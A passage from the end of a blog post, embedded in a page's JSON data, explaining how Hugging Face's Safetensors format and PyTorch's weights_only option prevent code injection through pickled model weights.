4, 6, 8]`.\n\n## How do Safetensors solve the problem?\n\nIn the first place, Safetensors do not use `pickle` to serialize and deserialize the state dict object. Instead, it uses a custom serialization method to store the model weights. In this way, the attacker cannot inject arbitrary code into the model weights. Amazingly, Safetensors are still fast as does zero-copy when storing and saving model weights. In simple words, Hugging Face's Safetensors ensure that your model weights files only contain the parameter data and nothing else.\n\nWe have also provided some examples of using safetensors to remove the security concerns in the my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor). For every example which demonstrates the malicious scenario, you just simply add the `--use-safetensor` flag to the command to see the difference.\n\nMoreover, if you still want to stick to `torch.load`, you can specify the argument `weights_only` so that PyTorch will restricts the unpickler to only unpickle the metadata and tensors.\n\n## References\n\n- https://www.reddit.com/r/learnpython/comments/ewrcuc/how_do_you_run_code_while_unpickling/\n- https://huggingface.co/docs/safetensors/en/index\n","tags":["deep learning","security"]}],"blogsPerPage":8,"NumPages":1},"__N_SSG":true},"page":"/blogs","query":{},"buildId":"HNYm-8xpJDnHM7ohpU4kw","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>